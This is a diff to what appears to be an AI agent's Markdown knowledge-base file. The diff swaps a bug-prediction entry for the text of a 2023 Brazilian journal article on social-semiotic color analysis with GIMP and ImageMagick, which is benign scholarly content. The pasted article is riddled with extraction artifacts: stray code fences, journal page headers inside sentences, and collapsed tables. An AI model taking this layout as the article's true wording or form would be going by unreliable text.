@@ -1261,1083 +1261,6808 @@ The cycle repeats until an audit results in "Zero Flaws". This ensures that no t
 ## 🧠 DEEP WISDOM INJECTION (Phase 5 Institutionalization)
 > Data ini adalah bagian dari memori inti agen yang diserap dari Knowledge Base.
 
-### 📘 KNOWLEDGE: NEXUS_AI_NEXT_GEN_BUGS.MD
+### 📘 KNOWLEDGE: NEXUS_12-31-4-2023-DOS-MATUMOTO,+GONÇALVES-SEGUNDO-A+SOCIAL-SEMIOTIC.MD
 
-# NEXUS AI — Prediksi Bug Generasi Berikutnya
+> **VERSION**: v1 | **Last Updated**: 26/05/2026
+
+Rev. Estud. Ling., Belo Horizonte, v. 31, n. 4, p. 2009-2065, 2023.
+```
+eISSN: 2237-2083 | DOI: 10.17851/2237-2083.31.4.2009-2065
+```
+A Social-Semiotic Approach to Color Analysis in Digital Media:
+Theory and Practice
+Uma abordagem sociossemiótica para análise de cores
+em mídias digitais: teoria e prática
+André de Oliveira Matumoto
+```
+Universidade de São Paulo (USP), São Paulo, São Paulo / Brasil
+```
+andrematumoto@usp.br
+```
+https://orcid.org/0000-0003-3544-3576
+```
+Paulo Roberto Gonçalves-Segundo
+```
+Universidade de São Paulo (USP), São Paulo, São Paulo / Brasil
+```
+paulosegundo@usp.br
+```
+https://orcid.org/0000-0002-5592-8098
+```
+```
+Abstract: This article aims to discuss the study of color from a social-semiotic
+```
+perspective. The article begins with an overview of Gunther Kress and Theo van
+Leeuwen’s distinctive feature approach to color in their Grammar of Visual Design
+```
+(2021) and concludes that the authors base their claims primarily on paintings and
+```
+print media, which may skew the categories toward analog media. Drawing on color
+```
+theory, mainly the contributions of Rhyne (2017), this article argues that social-semiotic
+```
+analyzes can benefit from systematized and quantitative categories for color analysis,
+especially for digital media corpora. The article introduces several analytic categories,
+such as color harmony and the RGB color space, that are relevant to understanding
+how color works in digital spaces. The paper proposes the use of the free and open
+source software GIMP and ImageMagick for a qualitative and quantitative approach
+to the distinctive features of color and for a better understanding of the complexity
+of colors and their meaning potential. Based on these methodological procedures, the
+distinctive feature approach is revised with Rhyne’s contribution. Finally, the categories
+are applied to two stock images as a case study.
+```
+Keywords: social semiotics; color theory; grammar of visual design.
+```
+```
+Resumo: Este artigo visa discutir o estudo da cor a partir da abordagem sociossemiótica.
+```
+Começando com uma visão geral da abordagem da cor por Gunther Kress e Theo
+Rev. Estud. Ling., Belo Horizonte, v. 31, n. 4, p. 2009-2065, 2023.2010
+```
+van Leeuwen, na sua Gramática de design visual (2021), conclui-se que os autores
+```
+baseiam as suas constatações principalmente em pinturas e mídias impressas, o que
+pode enviesar as categorias em direção aos meios analógicos. Baseado na teoria
+```
+das cores, principalmente nas contribuições de Rhyne (2017), o artigo argumenta
+```
+que as análises que partem da semiótica social podem se beneficiar de categorias
+especializadas para a análise da cor, principalmente para corpora de meios digitais.
+O artigo introduz uma série de categorias analíticas, tais como a harmonia de cores
+e o espaço de cor RGB, que são relevantes para compreender como funciona a cor
+nos espaços digitais. Para demonstrar as categorias aqui apresentadas, são utilizados
+os softwares gratuitos e de código aberto GIMP e ImageMagick. Eles permitem uma
+abordagem qualitativa e quantitativa das características distintivas da cor e permitem
+uma melhor compreensão da complexidade das cores e do seu potencial de significado.
+Com base nesses procedimentos metodológicos, a abordagem de traços distintivos é
+revista através das contribuições de Rhyne. Finalmente, como um estudo de caso, as
+categorias são aplicadas em duas stock images.
+```
+Palavras-chave: semiótica social; teoria das cores; gramática do design visual.
+```
+Recebido em 31 de janeiro de 2023.
+Aceito em 28 de agosto de 2023.
+1 Introduction
+People’s interest in understanding colors can be traced back to the
+5th century B.C., at least in Western civilization. The works of Alcmaeon
+of Croton are among the earliest evidence of the ancient Greeks’ attempts
+```
+to understand visuo-spatial perception (Pavlidis, 2021, p. 7). In the
+```
+millennia between Alcmaeon and modern society, many thinkers from
+a wide variety of perspectives have put forward theories about colors.
+Among them, we highlight two whose importance is still felt today: Isaac
+```
+Newton (1642-1726/27) and Johann Wolfgang von Goethe (1749-1832).
+```
+Newton is known, among other things, for his studies of light and color
+```
+(Pavlidis, 2021, p. 35-38), from which he derived the idea that colored
+```
+lights can be combined to produce other colors, as well as the claim that
+```
+white light is produced by combining different colors (Rhyne, 2017, p.
+```
+```
+3). Goethe, in turn, was also engaged in the study of colors outside of his
+```
+Rev. Estud. Ling., Belo Horizonte, v. 31, n. 4, p. 2009-2065, 2023.2011
+```
+literary works. In Zur Farbenlehre1 (1810), he created the basis for the
+```
+```
+Red, Yellow, and Blue color model (Rhyne, 2017, p. 9), which is often
+```
+taught in elementary schools. He also opposed Newton’s color theory,
+focusing instead on a qualitative model that considered perception and
+```
+the psychological and physiological effects of colors (Rhyne, 2017, p.
+```
+```
+9; Pavlidis, 2021, p. 44). In this sense,
+```
+Goethe rejected the ‘sterilised’ approach of a theory of colour,
+in which colour is deprived of its sensation, and is treated as an
+objective phenomenon even without the need for an observer to
+experience it. He was deeply certain that talking about colour has
+no meaning outside of the context of its perception, through the
+```
+active sensation of vision (Pavlidis, 2021, p. 45).
+```
+We do not consider inconsistent the studies of color meaning
+and effects and the studies of its materiality2. Instead, we conceive these
+approaches as complementary. In this article, we will draw upon the social
+```
+semiotic approach (Hodge; Kress, 1988) to discuss color as a meaning-
+```
+making resource. As such, we move closer to Goethe’s conception of
+color, since we cannot ignore the role of the observer in the semiotic
+process. At the same time, social semiotics places importance on the
+```
+materiality and affordances of the semiotic resources (Jewitt; Bezemer;
+```
+```
+O’halloran, 2016, p. 160).
+```
+It bears mentioning that the relation between materiality and
+perception can be quite complex. Bateman, Wildfeuer and Hiippala
+```
+(2017, p. 27) discuss that the immediate relation between the semiotic
+```
+1 In 1840, Charles Eastlake translated the book into English and called it Theory of
+Colours. It is worth noting that Eastlake omitted the parts where Goethe opposed
+```
+Newton’s observations (Possebon, 2009, p. 28-30; Rhyne, 2017, p. 11).
+```
+2 To return to Goethe’s proposal, although he opposed the scientific paradigm of his
+time, he also conducted experiments on color phenomena. In one of them, which sparked
+his opposition to Newton’s approach, he claimed that “Newton’s prismatic experiment
+was erroneous in that there is no green colour directly exiting a prism, but green is
+rather a composition of yellow and blue only after some distance from the prism, where
+```
+the two colours overlap” (Pavlidis, 2023, p. 44). However, “his observation is false
+```
+and depends on the topology of the experiment and typical light effects at boundaries”
+```
+(2023, p. 44). Similarly, Eastlake emphasized that Goethe would have received more
+```
+praise from the scientific community had he let others try to reconcile his findings with
+```
+current theory rather than attacking it so directly (1840, p. ix).
+```
+Rev. Estud. Ling., Belo Horizonte, v. 31, n. 4, p. 2009-2065, 2023.2012
+modes and resources and sensory channels is misleading. The authors
+point out that understanding the material qualities of the object does
+```
+not necessarily give us an understanding of how we perceive it (2017,
+```
+p. 27). For example, when we hear a sound, we receive a variety of
+information outside of its physical properties: space, direction, distance,
+etc. Conversely, as we will show in this paper, our perception may not
+be able to comprehend many material properties of semiotic resources,
+in our case colors.
+Therefore, we will discuss the meaning-making potential of
+colors, considering the fact that there are many aspects that may elude
+our perception. We consider colors as both quantitative and qualitative
+phenomena. Our proposal may help researchers systematize the analysis
+of colors as a visual resource, especially when it comes to digital media.
+To do so, we will first discuss how social semiotics, one of many
+approaches that attempt to systematize a perspective on colors, has
+historically analyzed them.
+One cannot overestimate the importance of Gunther Kress’
+contributions to the social-semiotic approach to multimodality. Together
+with Theo van Leeuwen, they discussed fundamental concepts and tools
+that are still productive for the analysis of different modes and media.
+Reading Images, written in 1990, was one of the first systematic attempts
+to understand the complexity of meaning in images. The book was
+aimed at teachers and focused on children’s drawings and illustrations
+```
+in textbooks (Kress; Van Leeuwen, 1996, p. vi). The authors expanded
+```
+their scope and wrote the first edition of Reading Images: The Grammar
+of Visual Design in 1996.
+As the name implies, the authors intended to create a grammar for
+the visual mode to “describe the way in which we depicted people, places
+and things combine in visual ‘statements’ of greater or lesser complexity
+```
+and extension” (Kress; Van Leeuwen, 1996, p. 1). The second edition
+```
+of the book was published in 2006 and the third edition in 2021, with
+each edition adding to and expanding the authors’ categories for visual
+grammar analysis. In this article, we will focus specifically on how Kress
+and van Leeuwen conceptualize color analysis.
+In the first edition of Reading Images: The Grammar of Visual
+```
+Design (1996, p. 165), the authors discuss color primarily as a modality
+```
+```
+marker under the categories of Saturation (a scale from full color to black
+```
+```
+and white), Differentiation (a scale from diversity to monochrome), and
+```
+Rev. Estud. Ling., Belo Horizonte, v. 31, n. 4, p. 2009-2065, 2023.2013
+```
+Modulation (a scale from a diversity of shades of the same color to the
+```
+```
+use of a single shade). Color also appears briefly in the discussion of
+```
+the materiality of meaning: In discussing the potential for meaning in
+brushstrokes, the authors cite, among other things, the use of color by
+```
+Wassily Kandinsky and Pieter Mondrian (1996, p. 236).
+```
+Prior to the second publication of Reading Images, Kress and van
+Leeuwen published the article “Colour as a Semiotic Mode: Notes for a
+```
+Grammar of Colour” (2002), which laid the foundation for their approach
+```
+to color. As in their visual grammar, the authors introduce the possibility
+```
+of a grammar of color (2002, p. 343). To this end, Kress and van Leeuwen
+```
+discuss the meaning-making potential of color based on Halliday’s
+```
+(1978) metafunctions and provide a brief overview of the history of color
+```
+```
+studies. Following Kandinsky (1977), the authors distinguish two types
+```
+```
+of affordances3 for color: association (or provenance) and the distinctive
+```
+```
+features of color (2002, p. 355).
+```
+Association refers to the meanings culturally and socially ascribed
+```
+to colors (Kress; Van Leeuwen, 2002, p. 355). For example, Red may
+```
+be associated with love, fire, or violence. These meanings come from
+the interests and use that sign makers have historically given to colors
+```
+(Jewitt, Bezemer; O’halloran, 2016, p. 156-7), and as such we understand
+```
+them even when they appear outside their original context. This in turn
+limits the way we interpret color.
+While the affordances of a colour may be limitless in theory, in
+practice they are not, and a plausible interpretation can usually be
+agreed on, provided the context of production and interpretation
+```
+is taken into account (Kress; Van Leeuwen, 2002, p. 355).
+```
+The second affordance is a set of distinctive features based on
+```
+Jakobson and Halle’s (1956) phonology. For example, if we paint a heart
+```
+with a pale Red color, we may interpret it differently from a bright Red
+heart. We may view the former as “sickly” or “fading,” as if it were a
+perishing love, while we may view the latter as full of life.
+In the second edition of Reading Images, color appears as a
+modality marker and in a separate section on the meaning of materiality
+3 The potential uses of a semiotic resource are based on its material features and on
+```
+the perception of the sign makers (Jewitt; Bezemer; O’halloran, 2016, p. 155; Van
+```
+```
+Leeuwen, 2005, p. 273;).
+```
+Rev. Estud. Ling., Belo Horizonte, v. 31, n. 4, p. 2009-2065, 2023.2014
+```
+rather than under brushstroke analysis (Kress; Van Leeuwen, 2006, p. 225-
+```
+```
+238). Following their proposal in the 2002 article, Kress and van Leeuwen
+```
+present their distinctive feature approach to color and its possibilities.
+In the third edition of Reading Images, the framework given in
+the second edition and in Kress and van Leeuwen’s 2002 article is largely
+maintained. Although the authors mention some digital media such as
+Microsoft PowerPoint, referring to an earlier work by van Leeuwen
+```
+(Van Leeuwen, 2011), most examples still refer mainly to paintings and
+```
+print media.
+A fundamental aspect of social semiotics that the authors
+emphasize is the impact that technology has on the meaning-making
+```
+process, particularly on “graphically realized semiotics” (Kress; Van
+```
+```
+Leeuwen, 2021, p. 227). Conversely, there are several digital methods
+```
+for multimodal analysis. For example, Bateman, Wildfeuer, and Hiippala
+discuss several tools for multimodal analysis in their book Multimodality
+```
+(2017), including computational methods such as neural networks for
+```
+```
+image description, color recognition, and labeling (Johnson; Karpathy;
+```
+```
+Fei-Fei, 2016, Karpathy; Fei-Fei, 2015).
+```
+Similarly, in this article, we will discuss how color theory
+and graphic design software can assist social-semiotics researchers,
+particularly in small-scale research. To this end, we rely primarily
+```
+on Rhyne’s (2017) propositions for color analysis in digital media.
+```
+We consider that the author’s detailed discussion of color theory is
+compatible with Kress and van Leeuwen’s distinctive feature approach
+and can greatly improve the analysis of digital corpora. We also present
+methods for visual analysis using the free and open source software GIMP
+```
+(gimp.org) and ImageMagick ( i magemagick.org/). We selected both
+```
+```
+software based on previous works (Matumoto, 2022a, 2022b; Matumoto;
+```
+```
+Gonçalves-Segundo, 2022a, 2022b) and chose to discuss replicable and
+```
+free methods for accessibility reasons.
+We organized the article as follows: First, we discuss the
+distinctive features approach as proposed by Kress and van Leeuwen
+```
+(2002; 2021). Then, we introduce some analytic categories as proposed by
+```
+```
+Rhyne (2017), the software GIMP and ImageMagick tools, and how they
+```
+allow us to visualize the author’s claims. We then apply the categories in
+a case study of two stock images, followed by the concluding remarks.
+Rev. Estud. Ling., Belo Horizonte, v. 31, n. 4, p. 2009-2065, 2023.2015
+2 The distinctive feature approach to color
+As mentioned earlier, we ground our considerations on the
+```
+social-semiotic framework (Hodge; Kress, 1988), in particular on the
+```
+```
+Grammar of Visual Design and its contributions to color analysis (Kress;
+```
+```
+Van Leeuwen, 2002; 2021). Building on Rhyne’s (2017) work, we intend
+```
+to extend Kress and van Leeuwen’s categories to the analysis of digital
+media and provide methods for color analysis.
+```
+Kress and van Leeuwen’s distinctive feature approach (2002;
+```
+```
+2021, p. 244-9) aims to analyze the meaning potential of colors based on
+```
+their material properties, such as Hue and Saturation. Table 1 summarizes
+the properties of colors:
+Table 1 – Color distinctive features
+Distinctive
+feature Description
+```
+Value Refers to the scale from “maximally light (white) to maximally dark(black)” (Kress; Van Leeuwen, 2021, p. 245).
+```
+```
+Saturation Refers to the scale from saturated, or pure, colors to the softest anddullest colors (Kress; Van Leeuwen, 2021, p. 245).
+```
+```
+Purity Refers to the scale from color purity, such as bright Red, to color hybridity,such as Orange-red, a mixture (Kress; Van Leeuwen, 2021, p. 245).
+```
+Modulation
+Refers to the scale from fully modulated colors, such as the many
+```
+shades of Blue, to flat colors, such as a single shade of Blue (Kress; Van
+```
+```
+Leeuwen, 2021, p. 245).
+```
+```
+Transparency Refers to the scale from transparency to opacity (Kress; Van Leeuwen,2021, p. 246).
+```
+```
+Luminosity Refers to the ability of a color to glow, to ‘stand out’ by itself (Kress;Van Leeuwen, 2021, p. 246-7).
+```
+```
+Differentiation Refers to the scale from monochromatic registers to a varied palette(Kress; Van Leeuwen, 2021, p. 247).
+```
+Hue
+```
+Refers to “the scale from Blue to Red” (Kress; Van Leeuwen, 247-
+```
+```
+8). Broadly speaking, it refers to what we often consider as the colors
+```
+themselves, such as red, blue, green, etc.
+```
+Source: Created by the authors.
+```
+Rev. Estud. Ling., Belo Horizonte, v. 31, n. 4, p. 2009-2065, 2023.2016
+These features are a robust set of categories for color analysis,
+and as the authors note, it is important to keep in mind the fact that all
+these features work together and therefore the meaning potential of a
+```
+particular color (or set of colors) depends on the configuration of the
+```
+```
+individual features (Kress; Van Leeuwen, 2021, p. 247). Moreover, signs
+```
+```
+function as “complex constellations” (Bateman; Wildfeuer; Hiippala,
+```
+```
+2017, p. 116). This means that the composition and the participants4
+```
+represented are as important as the colors used to represent them. From
+a social-semiotic point of view, we should always consider the context
+for the creation of the image and the relationship between the semiotic
+```
+choices and the discourses and ideologies (i.e., the association that results
+```
+```
+from the semiotic choices).
+```
+Returning to our example of the two hearts painted Red, we
+can confirm that our meaning hypothesis is based on the Red hue, its
+Saturation, the associations we attribute to these features, and the fact that
+we have drawn a heart, often associated with love. If we were to draw
+a campfire or a bloody landscape instead, we would no longer associate
+```
+Red with love (but with fire and violence), but we might still interpret
+```
+```
+Saturation in a similar way (for example, as a signifier of intensity).
+```
+Thus, as Kress and van Leeuwen noted, the possibilities of colors
+are not unlimited: They arise from culturally recognized uses, physical
+properties, and the way we perceive colors. Given the interplay of
+these aspects, especially perception, color analysis can be particularly
+challenging because what a color “is” may not be readily recognized in
+its entirety. This is noteworthy when we consider the way the authors
+formulate their categories:
+These distinctive features indicate, as in Jakobson and Halle’s
+```
+(1956) distinctive feature phonology, a quality which is visual
+```
+rather than acoustic, and is not systematized, as in phonology, as
+```
+structural oppositions but as values on a range of scales (Kress;
+```
+```
+Van Leeuwen, 2002, p. 355).
+```
+```
+In contrast to the phonology of Jakobson and Halle (1956), Kress
+```
+and van Leeuwen consider that each feature are values on a scale, such as
+```
+“light to dark,” rather than oppositions (such as [+voiced] and [-voiced]).
+```
+```
+4 A generic term for people, places, and things represented in the semiosis (Kress; Van
+```
+```
+Leeuwen, 2021, p. 45, 113–5).
+```
+Rev. Estud. Ling., Belo Horizonte, v. 31, n. 4, p. 2009-2065, 2023.2017
+However, the authors do not provide specific measures to determine, for
+```
+example, what is “maximally light” or “maximally black” (Kress; Van
+```
+```
+Leeuwen, 2002, p. 355).
+```
+This means that the analyzes may depend largely on perception,
+which does not always provide the most accurate representation of
+```
+the colors of the image (Figure 1). In addition, in some cases only a
+```
+few particularly salient colors are fully discernible, which can turn the
+categories into contrasts rather than scales. For example, different screens
+```
+(e.g., computer monitors and cell phone screens) can slightly alter the
+```
+colors displayed, which can affect how we interact with colors and, more
+importantly, how we analyze them.
+Figure 1 – Hue examples
+```
+Source: Created by the authors.
+```
+Figure 1 shows four sets of colors that we have created using
+```
+four color wheels based on Rhyne (2017, p. 33). The first is the original
+```
+```
+file, while the other three simulate color deficiencies (from left to right):
+```
+Protanope, Deuteranope, and Tritanope. To most people, all four wheels
+will look different, while some people5 will have difficulty perceiving
+the differences between the first wheel and the other three.
+Even outside of color deficiency, other factors can affect color
+perception, such as lighting conditions, positioning of the color, or what
+we focused on previously. This is particularly noticeable in optical
+illusions, such as the example in Figure 2.
+```
+5 According with the NHS (National Health Service), 1 in 12 men are and 1 in 200
+```
+women have some type of color vision deficiency.
+Rev. Estud. Ling., Belo Horizonte, v. 31, n. 4, p. 2009-2065, 2023.2018
+Figure 2 – Optical illusion
+```
+Source: Wikimedia commons (2007).
+```
+The two Orange spots are the same color, but we perceive them
+```
+differently (we might say one is darker than the other). Unlike the naked
+```
+eye, software such as GIMP, as we will demonstrate, can show us not
+only that they are the same, but also what they are in terms of Saturation,
+Brightness, and so on.
+These factors illustrate the complexity of color and color analysis.
+Kress and van Leeuwen’s scale approach is one way to account for the
+idiosyncrasies of color, although it does not present specific methods
+for accurately analyzing color data. However, we should remember not
+to downplay the role of perception in the semiotic process. Most people
+```
+who interact with images (whether on the internet or on print media)
+```
+will not have these tools to properly measure what color is. Designers,
+however, have a deep understanding of how color works and how to
+use it to convey what they want to communicate. Just as Kress and van
+```
+Leeuwen (2021, p. 238) inform us about the deeply material history of
+```
+color, we argue in this article that to understand the current semiotics
+of color, we must understand the processes by which they are created.
+With this in mind, we propose categories and methods that allow
+us to quantify and systematize the properties of color, particularly in
+digital media. With the aid of color theory, we can better understand
+what colors are and how they work. Using GIMP and ImageMagick, we
+can describe the various parameters that make up colors. Thus, we can
+effectively use the distinctive feature’s scales to analyze the meaning
+potential of colors. Therefore, our proposal introduces concepts and
+methods currently used by sign makers, which allows us to generate
+Rev. Estud. Ling., Belo Horizonte, v. 31, n. 4, p. 2009-2065, 2023.2019
+hypotheses based on tools used in the semiotic process. This opens the
+door to comparable and reproducible results for color analysis, which is
+particularly useful for understanding the use of color by different groups
+in different contexts.
+3 Basic concepts of color theory
+From the perspective of color theory, the concept of the color
+```
+model is particularly important. According to Rhyne (2017, p. 1), a color
+```
+model is “a structured system for creating a full range of colors from a
+small set of defined primary colors.” Also,
+There are three fundamental models of color theory. […] these
+```
+models are as follows: (1) the Red, Green, and Blue (RGB) color
+```
+model of lights and display originally explored by Isaac Newton in
+```
+1666; (2) the Cyan, Magenta, Yellow, and Key Black (CMYK) model
+```
+for printing in color originally patented by Jacob Christoph Le Blon in
+```
+1719; and (3) the Red, Yellow, Blue painters model fully summarized
+```
+```
+by Johann Wolfgang von Goethe in 1810 (Rhyne, 2017, p. 1).
+```
+In Table 2, we briefly summarize these three models:
+Table 2 – The color models
+Color
+model Description Visual representation
+RGB
+“The RGB color model assembles the
+primary lights of Red, Green, and Blue
+together in various combinations to
+produce a broad range of colors […].
+The RGB color model is termed as
+an additive color model in which the
+combination of the Red, Green, and Blue
+primary lights produces White light […]
+The RGB color model is used in various
+technologies producing color images,
+such as conventional photography and
+the display of images in electronic
+```
+systems” (Rhyne, 2017, p. 1).
+```
+Rev. Estud. Ling., Belo Horizonte, v. 31, n. 4, p. 2009-2065, 2023.2020
+Color
+model Description Visual representation
+CMYK
+“The CMYK color model is designed to
+support color printing on White article.
+The CMYK color model is termed as
+a subtractive color model in which the
+starting point begins with a White or
+light surface. Color pigments Reduce the
+reflection of the original White light. The
+color inks thus subtract from the original
+White surface. Typical output devices
+for the CMYK color model include
+color inkjet, laser, and dye-sublimation
+```
+printers” (Rhyne, 2017, p. 5).
+```
+RYB
+“The RYB color model is a subtractive
+color model for mixing painting
+pigments […]. Starting with White
+paper, RYB color pigments when
+combined together yield Black, similar
+to the CMYK color model […] The
+RYB color model is used in the arts and
+```
+arts education” (Rhyne, 2017, p. 7).
+```
+```
+Source: Created by the authors. Images adapted from Rhyne (2017, p. 2).
+```
+Since we will be using a digital corpus, we will focus mainly
+on the RGB system. First, we can visually represent colors on a color
+```
+wheel, which we can use to analyze how hues relate to each other (Rhyne,
+```
+```
+2017, p. 79). We can represent the RGB and CYMK models with the
+```
+same color wheel6, while the RYB model is different from the two, as
+shown in Figure 3:
+6 As seen in the visual representations in Table 2, the RGB and CYMK models are
+complementary, since their primary and complementary colors are the same but inverted
+```
+for each model (Rhyne, 2017, p. 82).
+```
+Rev. Estud. Ling., Belo Horizonte, v. 31, n. 4, p. 2009-2065, 2023.2021
+Figure 3 – Color wheels
+Color wheels for RGB and CYMK Color wheel for RYB
+```
+Source: Adapted on Rhyne (2017, p. 83).
+```
+Both wheels present hues7, tints, tones, and shades. In the outer
+area are the hues, the purest, most saturated colors. Tints are hues mixed
+with white and are placed next to them. Tones are mixed with gray and
+are placed in-between tints and shades, hues mixed with black. The
+```
+innermost region is the neutral gray (Rhyne, 2017, p. 83-5).
+```
+The color wheel allows us to detect color harmonies. Kress and
+```
+van Leeuwen (2021, p. 238) mention the concept but do not elaborate
+```
+on it. Harmonies are a way to systematize how colors can work well
+```
+together based on a main (or key) color (Rhyne, 2017, p. 86). In Table
+```
+3, we present the possible color harmonies for both color wheels, using
+Red as the main color:
+Table 3 – Color harmonies
+Color Harmony RGB/CYMKcolor wheels RYB color wheel
+```
+Monochromatic: a harmony
+```
+between a hue and its tints,
+```
+tones, and shades (RHYNE,
+```
+```
+2017, p. 87).
+```
+7 We will utilize the term “hue” to refer to one of color’s distinctive feature as well as
+to pure colors.
+Rev. Estud. Ling., Belo Horizonte, v. 31, n. 4, p. 2009-2065, 2023.2022
+Color Harmony RGB/CYMKcolor wheels RYB color wheel
+```
+Analogous: a harmony
+```
+between three colors adjacent
+to each other, of which the
+middle one is the main color
+```
+(Rhyne, 2017, p. 88).
+```
+```
+Complementary: a harmony
+```
+between one color and the
+color opposite to it in the color
+```
+wheel (Rhyne, 2017, p. 89).
+```
+Split complementary: a
+harmony between the
+main color and the two
+colors adjacent to its
+complementary color
+```
+(Rhyne, 2017, p. 90).
+```
+Rev. Estud. Ling., Belo Horizonte, v. 31, n. 4, p. 2009-2065, 2023.2023
+Color Harmony RGB/CYMKcolor wheels RYB color wheel
+Analogous complementary:
+a harmony between
+the key color and an
+analogous harmony of
+its complementary color
+```
+(Rhyne, 2017, p. 89).
+```
+Double complementary:
+a harmony between two
+adjacent colors and their
+respective complementary
+```
+colors (Rhyne, 2017, p. 92).
+```
+Tetrad-Rectangular: a
+harmony between four
+equally distant colors
+```
+(Rhyne, 2017, p. 93).
+```
+Tetrad-Square: a harmony
+between four equally distant
+colors, three steps from each
+```
+other (Rhyne, 2017, p. 94-5).
+```
+Rev. Estud. Ling., Belo Horizonte, v. 31, n. 4, p. 2009-2065, 2023.2024
+Color Harmony RGB/CYMKcolor wheels RYB color wheel
+```
+Diad: a harmony between two
+```
+colors, two steps from each
+```
+other (Rhyne, 2017, p. 95).
+```
+```
+Triad: a harmony between
+```
+three equally distant colors
+```
+(Rhyne, 2017, p. 96).
+```
+```
+Source: Created by the authors. Images based on Rhyne (2017).
+```
+In addition, the color wheel provides a visual representation of
+```
+warm and cool colors (Figure 4), which also influences the relationship
+```
+between colors and their potential for meaning:
+The color wheel can be divided into warm and cool colors. In
+general, Green, Blue, and Purple are defined as cool colors, while
+Yellow, Orange, and Red are grouped as warm colors. Warm colors
+tend to advance and expand in space. Cool colors tend to recede
+and contract in space. White, Gray, and Black are considered to
+be neutral in this regard. As a result, colors can have physiological
+```
+and psychological effects on people (Rhyne, 2017, p. 85).
+```
+Rev. Estud. Ling., Belo Horizonte, v. 31, n. 4, p. 2009-2065, 2023.2025
+Figure 4 – Cool and Warm colors
+```
+Source: Adapted from Rhyne (2017, p. 86).
+```
+The meaning-making potential that arises from color harmonies
+and the dichotomy of cool and warm colors is expansive. For example,
+complementary harmonies can be linked with associative affordances,
+```
+such as Red contrasting with Blue and Cyan (e.g., in a contrast between
+```
+```
+fire and water). They can also lead to what we might call “emergent
+```
+meanings,” or new possibilities based on the properties of colors. For
+```
+example, in Matumoto (2022b), we discussed how the games Aero
+```
+```
+Fighters 2 (VIDEO SYSTEM, 1994), Sonic Wings 2 (VIDEO SYSTEM,
+```
+```
+1996), and Strikers 1945 II (PSIKYO, 1997) use color harmonies to make
+```
+Brazil stand out among the other countries, reinforcing the representation
+of Brazil as a forest in contrast to the representation of most other
+countries in the game.
+Cool and warm colors evoke associative meanings simply by
+their names. They also have practical uses, for example in interior design:
+warm colors are perceived as closer, while cool colors are perceived as
+further away. We can use this to make a room seem more inviting, cozy, or
+spacious and relaxing, depending on the “temperature” of the color used.
+```
+Apart from the color wheel, we can represent web colors (colors
+```
+```
+for digital applications) by their RGB values or in hexadecimal format
+```
+```
+(HEX triplet) (Rhyne, 2017, p. 66). RGB values refer to the values of
+```
+```
+Red, Green, and Blue, from 0 (lowest value) to 255 (highest value), that
+```
+each color has for each of these three parameters. The HEX triplet “is a
+six-digit and three-byte hexadecimal number used to represent a color”
+WarmWarm
+Cool Cool
+Rev. Estud. Ling., Belo Horizonte, v. 31, n. 4, p. 2009-2065, 2023.2026
+```
+(Rhyne, 2017, p. 67). See Table 4 for a range of colors and their RGB
+```
+values and HEX triplets.
+Table 4 – Examples of RGB values and HEX triplets
+Color RGB values Hex triplets
+255, 0, 0 #FF0000
+0, 255, 0 #00FF00
+0, 0, 255 #0000FF
+255, 0, 100 #FF0064
+0, 100, 0 #006400
+50, 150, 255 #3296FF
+100, 90, 90 #645A5A
+255, 255, 255 #FFFFFF
+0, 0, 0 #000000
+```
+Source: Created by the authors.
+```
+We represent the RGB notation of a color as three values separated
+by commas. The first refers to the value of Red, the middle to the value of
+Green, and the last to the value of Blue. This means that the RGB color
+```
+space includes a total of 16,777,216 colors (or 256 to the 3 rd power). In
+```
+Table 4, we have modulated different values of each parameter to create
+nine RGB configurations. The first three are each pure Red, Green, and
+Blue, while the next three are mixtures. The seventh has no dominance
+between the three parameters, resulting in a grayish color. The last two
+have equal values for all three parameters but do not result in gray. This
+is because the lowest possible RGB values result in pure black, while the
+highest result in White. The HEX triplets represent the same information,
+but in a way that is easier for computers to process 8: the first two digits
+refer to Red, the middle two to Green, and the last two to Blue.
+```
+8 Cf. Rhyne (2017, p. 67) for a summary of how to read HEX triplets.
+```
+Rev. Estud. Ling., Belo Horizonte, v. 31, n. 4, p. 2009-2065, 2023.2027
+4 Analyzing colors with GIMP and ImageMagick
+An in-depth analysis based on RGB values and HEX triplets
+makes it possible to precisely locate the colors under investigation. For
+this purpose, the Color Picker Tool 9 in GIMP can be used to collect this
+```
+type of data (Table 5).
+```
+Table 5 – Color picker tool on GIMP
+Image Description
+```
+In the Toolbox of GIMP (on the left side of
+```
+```
+the program) we will find several tools10,
+```
+```
+including the color picker tool (highlighted
+```
+```
+by a gray box).
+```
+When we select it, the cursor turns into
+an eyedropper and crosshairs. If we click
+on the place where the crosshairs point, a
+small window will open.
+9 Whenever we introduce a new tool or option, we will provide a link to the GIMP
+Team Documentation Page, which describes the tool and how to use it.
+10 Tools with a small triangle in the bottom-right corner are swappable with a related
+tool by right-clicking its icon. In the color picker’s case, we can swap it for the measure
+tool, which functions similarly to a ruler.
+Rev. Estud. Ling., Belo Horizonte, v. 31, n. 4, p. 2009-2065, 2023.2028
+Image Description
+In this window, we will find several
+pieces of information. In the columns, the
+researcher can choose which color model
+to display. In this case, the left column is
+the HSV color space and the right column
+is the RGB model. HEX refers to the HEX
+triplet, and finally, X and Y refer to the
+coordinates of the selected pixel. Pixels are
+the smallest units in digital images.
+We return to Figure 2 to verify that the
+two Orange spots are indeed made up of
+the same color. The difference between the
+```
+examined pixels is their positions (X and
+```
+```
+Y values).
+```
+If we want to sample more than one point
+```
+(or pixel) of the image, we can select the
+```
+sample average option in the Tool options,
+which are located under the Toolbox by
+default. The Radius options refer to the
+area that will be sampled by the tool.
+When this option is selected, GIMP
+displays the average color of the selected
+area instead of the exact pixel selected.
+```
+Source: Created by the authors.
+```
+Using the color picker tool of GIMP, we can identify specific
+colors in the composition or select a group of colors to determine the
+overall color in a specific area of the image. This means that we do not
+have to consider colors as a comparative category, in the sense that Hue,
+Rev. Estud. Ling., Belo Horizonte, v. 31, n. 4, p. 2009-2065, 2023.2029
+Saturation, Brightness, etc. are understandable and quantifiable on their
+own, not in comparison to the rest of the composition.
+```
+The HSV (Hue, Saturation, and Value) and the HSL (Hue,
+```
+```
+Saturation, and Lightness) are three-dimensional representations of the
+```
+```
+RGB color model11 (Rhyne, 2017, p. 58). In Table 6, we briefly discuss
+```
+the individual parameters:
+Table 6 – HSV and HSL color spaces
+Parameter Description
+Hue
+Refers to color gradations shown in a circle that begins and ends at the
+color Red, at 0 degrees. The color wheel shown earlier follows this
+organization, and starting from Red, Cyan, for example, is at 180 degrees,
+```
+directly opposite to Red (Rhyne, 2017, p. 61).
+```
+Saturation
+Refers to the distinction between a particular hue and the neutral gray in
+the center of the color wheel, where no hue dominates. For this reason, the
